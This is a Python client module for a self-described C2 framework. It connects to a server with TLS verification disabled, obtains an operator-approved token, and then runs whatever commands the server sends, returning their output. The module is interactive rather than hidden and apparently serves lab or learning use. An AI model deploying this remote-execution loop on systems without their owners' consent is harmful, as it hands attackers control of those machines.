"""
Client Connection Module
Handles connection to C2 server and command execution loop
"""

import socket
import ssl
import platform
import time
import os
from common.protocol import send_message, recv_message
from common.config import (
    TLS_ENABLED, TOKEN_FILE_CLIENT, TOKEN_POLL_INTERVAL,
    MSG_REGISTER, MSG_CMD, MSG_RESULT, MSG_TOKEN_REQUEST, MSG_TOKEN_STATUS,
    TOKEN_APPROVED, TOKEN_PENDING, TOKEN_DENIED, TOKEN_REVOKED, TOKEN_INVALID
)
from client.executor import execute_command


def get_hostname():
    """
    Get client hostname/identifier

    Returns:
        str: Client hostname
    """
    try:
        return platform.node()
    except:
        return "unknown-client"


def load_client_token():
    """
    Load token from client token file

    Returns:
        str: Token or None if not found
    """
    if not os.path.exists(TOKEN_FILE_CLIENT):
        return None

    with open(TOKEN_FILE_CLIENT, 'r') as f:
        return f.read().strip()


def save_client_token(token):
    """
    Save token to client token file

    Args:
        token: Token string to save
    """
    with open(TOKEN_FILE_CLIENT, 'w') as f:
        f.write(token)
    print(f"[+] Token saved to {TOKEN_FILE_CLIENT}")


def request_token_from_server(server_host, port):
    """
    Request a new token from the server and wait for approval

    Args:
        server_host: Server IP address
        port: Server port number

    Returns:
        str: Approved token or None if denied/error
    """
    try:
        print(f"[*] Connecting to {server_host}:{port}...")

        # Create socket and connect
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10)
        sock.connect((server_host, port))

        # Wrap with TLS if enabled
        if TLS_ENABLED:
            ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
            ssl_context.check_hostname = False
            ssl_context.verify_mode = ssl.CERT_NONE
            sock = ssl_context.wrap_socket(sock, server_hostname=server_host)

        hostname = get_hostname()

        # Get client IP (from socket's local address perspective)
        try:
            client_ip = sock.getsockname()[0]
        except:
            client_ip = "unknown"

        # Send token request
        request_msg = f"{MSG_TOKEN_REQUEST}:{hostname}:{client_ip}"
        send_message(sock, request_msg)
        print(f"[*] Token request sent for hostname: {hostname}")

        # Wait for initial response
        response = recv_message(sock)
        if not response or not response.startswith(MSG_TOKEN_STATUS):
            print("[!] Invalid server response")
            sock.close()
            return None

        # Parse status
        parts = response.split(':', 1)
        if len(parts) < 2:
            print("[!] Invalid status message")
            sock.close()
            return None

        status_data = parts[1]
        status_parts = status_data.split(':', 1)
        status = status_parts[0]

        # Handle different statuses
        if status == TOKEN_APPROVED:
            # Already approved - get token
            if len(status_parts) > 1:
                token = status_parts[1]
                print("[+] Token request approved!")
                sock.close()
                return token
            else:
                print("[!] Approved but no token received")
                sock.close()
                return None

        elif status == TOKEN_PENDING:
            print("[*] Token request pending approval...")
            print("[*] Waiting for server operator to approve...")

            # Poll for approval
            poll_count = 0
            max_polls = 120  # 10 minutes max wait (120 * 5 seconds)

            while poll_count < max_polls:
                time.sleep(TOKEN_POLL_INTERVAL)
                poll_count += 1

                # Check status
                try:
                    # Send a small keepalive/status check
                    send_message(sock, f"{MSG_TOKEN_REQUEST}:{hostname}:status_check")
                    response = recv_message(sock)

                    if not response:
                        print("[!] Connection lost")
                        sock.close()
                        return None

                    if response.startswith(MSG_TOKEN_STATUS):
                        status_data = response.split(':', 1)[1]
                        status_parts = status_data.split(':', 1)
                        status = status_parts[0]

                        if status == TOKEN_APPROVED:
                            if len(status_parts) > 1:
                                token = status_parts[1]
                                print("[+] Token approved!")
                                sock.close()
                                return token

                        elif status == TOKEN_DENIED:
                            print("[!] Token request denied by server operator")
                            sock.close()
                            return None

                        elif status == TOKEN_PENDING:
                            # Still pending
                            if poll_count % 6 == 0:  # Print every 30 seconds
                                print(f"[*] Still waiting for approval... ({poll_count * TOKEN_POLL_INTERVAL}s elapsed)")
                            continue

                except Exception as e:
                    print(f"[!] Error while waiting: {e}")
                    sock.close()
                    return None

            print("[!] Timeout waiting for approval")
            sock.close()
            return None

        elif status == TOKEN_DENIED:
            print("[!] Token request denied")
            sock.close()
            return None

        else:
            print(f"[!] Unknown status: {status}")
            sock.close()
            return None

    except ConnectionRefusedError:
        print("[!] Connection refused")
        return None
    except ssl.SSLError as e:
        print(f"[!] TLS error: {e}")
        return None
    except Exception as e:
        print(f"[!] Error: {e}")
        return None


def connect_to_server(server_host, port, token):
    """
    Connect to C2 server and register with token

    Args:
        server_host: Server IP address
        port: Server port number
        token: Authentication token

    Returns:
        socket: Connected socket or None on error
    """
    try:
        # Create socket and connect
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)  # 5 second connection timeout
        print(f"[*] Connecting to {server_host}:{port}...")
        sock.connect((server_host, port))

        # Wrap with TLS if enabled
        if TLS_ENABLED:
            ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
            ssl_context.check_hostname = False
            ssl_context.verify_mode = ssl.CERT_NONE
            sock = ssl_context.wrap_socket(sock, server_hostname=server_host)

        # Remove timeout for normal operation
        sock.settimeout(None)

        # Send registration with token
        hostname = get_hostname()
        if not send_message(sock, f"{MSG_REGISTER}:{hostname}:{token}"):
            print("[!] Failed to send registration message")
            sock.close()
            return None

        # Wait for authentication response from server
        # Server MUST send TOKEN_STATUS message (APPROVED, REVOKED, or INVALID)
        sock.settimeout(10)  # 10 second timeout for auth response

        try:
            response = recv_message(sock)
        except socket.timeout:
            print("[!] Timeout waiting for server response")
            print("[*] Server may be down or not responding")
            sock.close()
            return None

        # Check if we received a response
        if response is None:
            print("[!] No response from server")
            print("[*] Connection may have been lost")
            sock.close()
            return None

        # Response must be a TOKEN_STATUS message
        if not response.startswith(MSG_TOKEN_STATUS):
            print(f"[!] Unexpected response from server: {response[:50]}")
            sock.close()
            return None

        # Parse the token status
        status_parts = response.split(':', 1)
        if len(status_parts) < 2:
            print("[!] Invalid TOKEN_STATUS message format")
            sock.close()
            return None

        status = status_parts[1]

        # Handle authentication result
        if status == TOKEN_APPROVED:
            # Authentication successful!
            sock.settimeout(None)  # Remove timeout for normal operation
            print(f"[+] Authentication successful")
            print(f"[+] Connected to {server_host}:{port}")
            print(f"[+] Registered as: {hostname}")
            return sock

        elif status == TOKEN_REVOKED:
            print(f"[!] Authentication failed - token has been REVOKED")
            sock.close()
            return "REVOKED_TOKEN"

        elif status == TOKEN_INVALID:
            print(f"[!] Authentication failed - token is INVALID")
            sock.close()
            return "INVALID_TOKEN"

        else:
            print(f"[!] Unknown authentication status: {status}")
            sock.close()
            return None

    except socket.timeout:
        print("[!] Connection timeout - server not responding")
        print("[*] Make sure the server is running and IP/PORT are correct")
        return None
    except ConnectionRefusedError:
        print("[!] Connection refused - server is not running or port is blocked")
        return None
    except ssl.SSLError as e:
        print(f"[!] TLS error: {e}")
        return None
    except Exception as e:
        print(f"[!] Connection error: {e}")
        return None


def main_loop(sock):
    """
    Main command execution loop

    Args:
        sock: Connected socket
    """
    while True:
        try:
            # Wait for command from server
            message = recv_message(sock)

            if message is None:
                break

            # Handle token status messages (revocation/deletion)
            if message.startswith(MSG_TOKEN_STATUS):
                status_parts = message.split(':', 1)
                if len(status_parts) > 1:
                    status = status_parts[1]

                    if status == TOKEN_REVOKED:
                        print("\n" + "="*60)
                        print("[!] YOUR TOKEN HAS BEEN REVOKED")
                        print("="*60)
                        print("[*] You have been disconnected from the server")
                        print("[*] Your token file has NOT been deleted")
                        print("[*] Contact the server administrator to renew your access")
                        print("="*60)
                        # Don't delete token - it can be renewed
                        break

                    elif status == 'deleted':
                        print("\n" + "="*60)
                        print("[!] YOUR TOKEN HAS BEEN DELETED")
                        print("="*60)
                        print("[*] Deleting local token file...")

                        # Delete local token file
                        if os.path.exists(TOKEN_FILE_CLIENT):
                            try:
                                os.remove(TOKEN_FILE_CLIENT)
                                print(f"[+] Local token file '{TOKEN_FILE_CLIENT}' deleted")
                            except Exception as e:
                                print(f"[!] Failed to delete token file: {e}")

                        print("[*] You must request a new token to reconnect")
                        print("="*60)
                        break

            # Parse command
            elif message.startswith(MSG_CMD):
                command = message.split(':', 1)[1]

                # Execute command
                stdout, stderr = execute_command(command)

                # Send result back
                result = f"{MSG_RESULT}:{stdout}|||{stderr}"

                if not send_message(sock, result):
                    break

        except KeyboardInterrupt:
            break
        except Exception:
            break


def connect_and_run(server_host, port):
    """
    Connect to server and run command execution loop with token management

    Args:
        server_host: Server IP address
        port: Server port number
    """
    # Main connection loop
    while True:
        # IMPORTANT: Reload token from file on each connection attempt
        # This ensures we use the latest token if it was deleted/renewed
        token = load_client_token()

        if token:
            print(f"[+] Token found in {TOKEN_FILE_CLIENT}")
        else:
            print(f"[!] No token found in {TOKEN_FILE_CLIENT}")
            print("[*] You need a token to connect to the C2 server")

            # Ask user if they want to request a token
            choice = input("\n[?] Request token from server? (y/n): ").strip().lower()

            if choice != 'y':
                print("[*] Cannot connect without a token. Exiting.")
                return

            # Request token
            token = request_token_from_server(server_host, port)

            if token:
                save_client_token(token)
                print("[+] Token received and saved!")
                print("[*] You can now connect to the server")
            else:
                print("[!] Failed to obtain token")
                return

        # Connect with current token
        sock = connect_to_server(server_host, port, token)

        # Check if token was revoked (suspended)
        if sock == "REVOKED_TOKEN":
            print("\n" + "="*60)
            print("[!] ACCESS SUSPENDED")
            print("="*60)
            print("[*] Your token has been REVOKED by the server operator")
            print("[*] Your access is temporarily suspended")
            print(f"[*] Token file kept: {TOKEN_FILE_CLIENT}")
            print("[*] Contact the server administrator to renew your access")
            print("[*] Your token can be renewed without requesting a new one")
            print("="*60)

            # Ask if they want to try reconnecting (in case it was renewed)
            choice = input("\n[?] Try reconnecting? (y/n): ").strip().lower()

            if choice == 'y':
                # Loop will reload token and try again
                continue
            else:
                print("[*] Exiting. Contact administrator to renew your access.")
                break

        # Check if token was rejected as invalid
        elif sock == "INVALID_TOKEN":
            print("\n" + "="*60)
            print("[!] AUTHENTICATION FAILED")
            print("="*60)
            print("[*] Your token is invalid or expired")
            print(f"[*] Deleting invalid token file: {TOKEN_FILE_CLIENT}")

            # Delete invalid token
            if os.path.exists(TOKEN_FILE_CLIENT):
                try:
                    os.remove(TOKEN_FILE_CLIENT)
                    print(f"[+] Invalid token file deleted")
                except Exception as e:
                    print(f"[!] Failed to delete token file: {e}")

            # Ask if they want to request a new token
            choice = input("\n[?] Request a new token from server? (y/n): ").strip().lower()

            if choice == 'y':
                # Request new token
                new_token = request_token_from_server(server_host, port)

                if new_token:
                    save_client_token(new_token)
                    print("[+] New token received and saved!")
                    # Token will be reloaded from file on next loop iteration
                    continue
                else:
                    print("[!] Failed to obtain new token")
                    break
            else:
                print("[*] Cannot connect without a valid token. Exiting.")
                break

        elif sock:
            try:
                main_loop(sock)
            except Exception as e:
                print(f"[!] Error in main loop: {e}")
            finally:
                sock.close()
                print("[*] Disconnected from server")
        else:
            print("[!] Failed to connect")

        # Ask user if they want to reconnect
        choice = input("\nReconnect? (y/n): ").strip().lower()

        if choice != 'y':
            break

        time.sleep(1)
